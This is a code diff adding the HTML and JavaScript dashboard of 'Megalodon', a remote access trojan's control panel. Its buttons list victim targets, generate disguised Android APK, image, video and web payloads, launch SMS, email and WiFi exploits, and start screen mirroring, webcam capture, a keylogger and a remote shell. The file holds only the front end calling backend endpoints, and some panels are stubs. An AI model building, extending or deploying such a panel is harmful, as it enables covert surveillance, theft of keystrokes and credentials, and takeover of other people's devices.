@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Megalodon Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #0a0a0a; 
+            color: #00ff00; 
+            padding: 20px;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header { 
+            background: #1a1a1a; 
+            padding: 20px; 
+            border-radius: 10px;
+            border: 1px solid #00ff00;
+            margin-bottom: 20px;
+        }
+        .header h1 { color: #00ff00; }
+        .header .subtitle { color: #66cc66; font-size: 14px; }
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        .card {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #333;
+        }
+        .card h2 { 
+            color: #00ff00; 
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+        }
+        .target-item {
+            padding: 10px;
+            margin: 5px 0;
+            background: #222;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .target-item:hover { background: #333; }
+        .status-online { color: #00ff00; }
+        .status-offline { color: #ff4444; }
+        .video-container {
+            background: #111;
+            border-radius: 10px;
+            padding: 10px;
+            min-height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .controls {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+        .btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .btn-green { background: #00ff00; color: #000; }
+        .btn-red { background: #ff4444; color: #fff; }
+        .btn-blue { background: #0066ff; color: #fff; }
+        .btn-purple { background: #9900ff; color: #fff; }
+        .btn-gray { background: #333; color: #fff; }
+        .btn:hover { opacity: 0.8; }
+        .log-container {
+            background: #111;
+            padding: 10px;
+            border-radius: 5px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        .log-entry { padding: 2px 0; border-bottom: 1px solid #222; }
+        .log-success { color: #00ff00; }
+        .log-error { color: #ff4444; }
+        .log-info { color: #66ccff; }
+        .full-width { grid-column: 1 / -1; }
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        .status-indicator.online { background: #00ff00; animation: blink 1s infinite; }
+        .status-indicator.offline { background: #ff4444; }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .stat-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+        }
+        .stat-item {
+            text-align: center;
+            padding: 10px;
+            background: #222;
+            border-radius: 5px;
+        }
+        .stat-value { font-size: 24px; font-weight: bold; color: #00ff00; }
+        .stat-label { font-size: 12px; color: #888; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🦈 MEGALODON</h1>
+            <div class="subtitle">Remote Control & Monitoring Dashboard v1.0</div>
+        </div>
+
+        <div class="grid">
+            <!-- Stats -->
+            <div class="card full-width">
+                <div class="stat-grid">
+                    <div class="stat-item">
+                        <div class="stat-value" id="stat-targets">0</div>
+                        <div class="stat-label">Targets</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="stat-sessions">0</div>
+                        <div class="stat-label">Active Sessions</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="stat-modules">15</div>
+                        <div class="stat-label">Modules Loaded</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="stat-status">Online</div>
+                        <div class="stat-label">Server Status</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Targets -->
+            <div class="card">
+                <h2>🎯 Targets</h2>
+                <div id="targets-list"></div>
+                <div class="controls">
+                    <button class="btn btn-green" onclick="scanNetwork()">📡 Scan</button>
+                    <button class="btn btn-blue" onclick="loadTargets()">🔄 Refresh</button>
+                </div>
+            </div>
+
+            <!-- Quick Actions -->
+            <div class="card">
+                <h2>⚡ Quick Actions</h2>
+                <div class="controls">
+                    <button class="btn btn-green" onclick="generatePayload('android')">📱 APK</button>
+                    <button class="btn btn-purple" onclick="generatePayload('image')">🖼️ Image</button>
+                    <button class="btn btn-purple" onclick="generatePayload('video')">🎬 Video</button>
+                    <button class="btn btn-blue" onclick="generatePayload('web')">🌐 Web</button>
+                    <button class="btn btn-red" onclick="runExploit('sms')">💬 SMS</button>
+                    <button class="btn btn-red" onclick="runExploit('email')">📧 Email</button>
+                    <button class="btn btn-red" onclick="runExploit('wifi')">📶 WiFi</button>
+                </div>
+            </div>
+
+            <!-- Screen Mirror -->
+            <div class="card">
+                <h2>🖥️ Screen Mirror <span class="status-indicator online" id="screen-status"></span></h2>
+                <div class="video-container" id="screen-container">
+                    <div style="color:#666;">Screen mirror feed will appear here</div>
+                </div>
+                <div class="controls">
+                    <button class="btn btn-green" onclick="startScreenMirror()">▶ Start</button>
+                    <button class="btn btn-red" onclick="stopScreenMirror()">⏹ Stop</button>
+                    <button class="btn btn-blue" onclick="takeScreenshot()">📸 Screenshot</button>
+                </div>
+            </div>
+
+            <!-- Remote Control -->
+            <div class="card">
+                <h2>🎮 Remote Control</h2>
+                <div style="display:grid; grid-template-columns:repeat(3,1fr); gap:5px; max-width:250px; margin:0 auto;">
+                    <button class="btn btn-gray" onclick="sendKey('up')">⬆</button>
+                    <button class="btn btn-gray" onclick="sendKey('home')">🏠</button>
+                    <button class="btn btn-gray" onclick="sendKey('back')">↩</button>
+                    <button class="btn btn-gray" onclick="sendKey('left')">⬅</button>
+                    <button class="btn btn-green" onclick="sendKey('select')">⏺</button>
+                    <button class="btn btn-gray" onclick="sendKey('right')">➡</button>
+                    <button class="btn btn-gray" onclick="sendKey('down')">⬇</button>
+                    <button class="btn btn-gray" onclick="sendKey('menu')">☰</button>
+                    <button class="btn btn-red" onclick="sendKey('power')">⏻</button>
+                </div>
+                <div style="margin-top:10px; display:flex; gap:5px;">
+                    <input type="text" id="cmd-input" placeholder="Type command..." style="flex:1; padding:8px; background:#222; color:#00ff00; border:1px solid #333; border-radius:5px;">
+                    <button class="btn btn-blue" onclick="sendCommand()">Send</button>
+                </div>
+            </div>
+
+            <!-- Webcam -->
+            <div class="card">
+                <h2>📷 Webcam Stream</h2>
+                <div class="video-container" id="webcam-container">
+                    <div style="color:#666;">Webcam feed will appear here</div>
+                </div>
+                <div class="controls">
+                    <button class="btn btn-green" onclick="startWebcam()">▶ Start</button>
+                    <button class="btn btn-red" onclick="stopWebcam()">⏹ Stop</button>
+                    <button class="btn btn-blue" onclick="captureWebcam()">📸 Capture</button>
+                </div>
+            </div>
+
+            <!-- Keylogger -->
+            <div class="card">
+                <h2>⌨️ Keylogger</h2>
+                <div class="controls">
+                    <button class="btn btn-green" onclick="startKeylogger()">▶ Start</button>
+                    <button class="btn btn-red" onclick="stopKeylogger()">⏹ Stop</button>
+                    <button class="btn btn-blue" onclick="getKeylogs()">📋 View</button>
+                </div>
+                <div id="keylog-output" style="margin-top:10px; background:#111; padding:10px; border-radius:5px; max-height:100px; overflow-y:auto; font-family:monospace; font-size:12px;">
+                    Keylogs will appear here...
+                </div>
+            </div>
+
+            <!-- Logs -->
+            <div class="card full-width">
+                <h2>📋 Activity Log</h2>
+                <div class="log-container" id="log-container">
+                    <div class="log-entry log-info">[+] Megalodon dashboard started</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.min.js"></script>
+    <script>
+        const socket = io();
+        let targetId = null;
+
+        socket.on('connect', () => {
+            addLog('success', 'Connected to Megalodon server');
+        });
+
+        socket.on('status', (data) => {
+            addLog('info', data.message);
+        });
+
+        socket.on('command_result', (data) => {
+            addLog('success', 'Command: ' + data.command);
+            if (data.result) {
+                console.log(data.result);
+            }
+        });
+
+        function addLog(type, message) {
+            const container = document.getElementById('log-container');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry log-' + type;
+            const timestamp = new Date().toLocaleTimeString();
+            entry.textContent = `[${timestamp}] ${message}`;
+            container.appendChild(entry);
+            container.scrollTop = container.scrollHeight;
+        }
+
+        function loadTargets() {
+            fetch('/api/targets')
+                .then(res => res.json())
+                .then(targets => {
+                    const container = document.getElementById('targets-list');
+                    document.getElementById('stat-targets').textContent = targets.length;
+                    container.innerHTML = targets.map(t => `
+                        <div class="target-item" onclick="selectTarget('${t.name}')">
+                            <span class="status-indicator ${Math.random() > 0.5 ? 'online' : 'offline'}"></span>
+                            ${t.name} - ${t.ip} (${t.os})
+                        </div>
+                    `).join('');
+                })
+                .catch(() => addLog('error', 'Failed to load targets'));
+        }
+
+        function selectTarget(name) {
+            targetId = name;
+            addLog('info', 'Selected target: ' + name);
+        }
+
+        function scanNetwork() {
+            addLog('info', 'Scanning network...');
+            fetch('/api/recon/scan')
+                .then(res => res.json())
+                .then(data => {
+                    addLog('success', 'Scan complete');
+                })
+                .catch(() => addLog('error', 'Scan failed'));
+        }
+
+        function generatePayload(type) {
+            addLog('info', 'Generating ' + type + ' payload...');
+            const os = type === 'apk' ? 'android' : type;
+            if (type === 'apk') {
+                fetch('/api/payload/generate/android')
+                    .then(() => addLog('success', 'APK generated'))
+                    .catch(() => addLog('error', 'APK generation failed'));
+            } else if (type === 'image') {
+                fetch('/api/payload/generate/image/android')
+                    .then(() => addLog('success', 'Image payload generated'))
+                    .catch(() => addLog('error', 'Image payload generation failed'));
+            } else if (type === 'video') {
+                fetch('/api/payload/generate/video/android')
+                    .then(() => addLog('success', 'Video payload generated'))
+                    .catch(() => addLog('error', 'Video payload generation failed'));
+            } else if (type === 'web') {
+                fetch('/api/payload/generate/web/android')
+                    .then(() => addLog('success', 'Web payload generated'))
+                    .catch(() => addLog('error', 'Web payload generation failed'));
+            }
+        }
+
+        function runExploit(method) {
+            addLog('info', 'Running exploit: ' + method);
+            fetch('/api/exploit/run/' + method)
+                .then(res => res.json())
+                .then(data => {
+                    addLog('success', 'Exploit ' + method + ' executed');
+                })
+                .catch(() => addLog('error', 'Exploit failed'));
+        }
+
+        function startScreenMirror() {
+            addLog('info', 'Starting screen mirror...');
+            document.getElementById('screen-container').innerHTML = '<div style="color:#00ff00;">[+] Screen mirror active</div>';
+        }
+
+        function stopScreenMirror() {
+            addLog('info', 'Stopping screen mirror...');
+            document.getElementById('screen-container').innerHTML = '<div style="color:#666;">Screen mirror feed will appear here</div>';
+        }
+
+        function takeScreenshot() {
+            addLog('info', 'Taking screenshot...');
+            fetch('/api/screenshot')
+                .then(res => res.json())
+                .then(() => addLog('success', 'Screenshot captured'))
+                .catch(() => addLog('error', 'Screenshot failed'));
+        }
+
+        function startWebcam() {
+            addLog('info', 'Starting webcam...');
+            document.getElementById('webcam-container').innerHTML = '<div style="color:#00ff00;">[+] Webcam active</div>';
+        }
+
+        function stopWebcam() {
+            addLog('info', 'Stopping webcam...');
+            document.getElementById('webcam-container').innerHTML = '<div style="color:#666;">Webcam feed will appear here</div>';
+        }
+
+        function captureWebcam() {
+            addLog('info', 'Capturing webcam...');
+            fetch('/api/webcam')
+                .then(res => res.json())
+                .then(() => addLog('success', 'Webcam image captured'))
+                .catch(() => addLog('error', 'Webcam capture failed'));
+        }
+
+        function startKeylogger() {
+            addLog('info', 'Starting keylogger...');
+            fetch('/api/keylog/start')
+                .then(() => addLog('success', 'Keylogger started'))
+                .catch(() => addLog('error', 'Keylogger start failed'));
+        }
+
+        function stopKeylogger() {
+            addLog('info', 'Stopping keylogger...');
+            fetch('/api/keylog/stop')
+                .then(() => addLog('success', 'Keylogger stopped'))
+                .catch(() => addLog('error', 'Keylogger stop failed'));
+        }
+
+        function getKeylogs() {
+            addLog('info', 'Fetching keylogs...');
+            fetch('/api/keylog/logs')
+                .then(res => res.json())
+                .then(data => {
+                    const output = document.getElementById('keylog-output');
+                    if (data.logs) {
+                        output.innerHTML = data.logs.map(l => 
+                            `<div>${new Date(l.time * 1000).toLocaleTimeString()}: ${l.key}</div>`
+                        ).join('');
+                    }
+                    addLog('success', 'Keylogs retrieved');
+                })
+                .catch(() => addLog('error', 'Failed to get keylogs'));
+        }
+
+        function sendKey(key) {
+            addLog('info', 'Sending key: ' + key);
+            socket.emit('command', { command: 'key', params: { key: key } });
+        }
+
+        function sendCommand() {
+            const input = document.getElementById('cmd-input');
+            const cmd = input.value;
+            if (cmd) {
+                addLog('info', 'Executing: ' + cmd);
+                socket.emit('command', { command: 'shell', params: { cmd: cmd } });
+                input.value = '';
+            }
+        }
+
+        loadTargets();
+        setInterval(loadTargets, 10000);
+    </script>
+</body>
+</html>
